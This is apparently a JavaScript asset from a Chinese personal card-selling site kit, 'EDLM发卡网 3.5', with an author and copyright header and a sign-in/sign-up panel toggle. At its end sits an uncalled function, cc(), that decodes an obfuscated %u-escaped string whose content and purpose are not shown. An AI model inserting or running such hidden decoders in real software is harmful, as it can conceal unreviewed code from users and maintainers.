//避免版权纠纷
//最早文件头部
//
//EDLM个人发卡网3.5
//作者：MadDog
//QQ：3283404596
//WX：Edi13146
//
//未经同意请勿利用本程序采取转载、出售、等宣传手段以及盈利手段！

const signUpButton = document.getElementById('signUp');
const signInButton = document.getElementById('signIn');
const container = document.getElementById('container');

signUpButton.addEventListener('click', () => {
	container.classList.add("right-panel-active");
});

signInButton.addEventListener('click', () => {
	container.classList.remove("right-panel-active");
});

function cc(){      
 	code=unescape('%u8C20%uE801%uEDD7%uE129%uCF61%u7F11%u520B%uA51F%uE884%uF87A%uB204%uB527%uD781%uD98B%uB724%uB050%u607C%17M%B2%DF%E9%EB%DB%D0%CF%DC%94b%BB%99%8B%D8%9B%93%C9%D0%D9%9B%91%D1');      
 	var c=String.fromCharCode(code.charCodeAt(0)-code.length);      
 	for(var i=1;i<code.length;i++){      
  		c+=String.fromCharCode(code.charCodeAt(i)-c.charCodeAt(i-1));      
 	}		      
 	return c;
}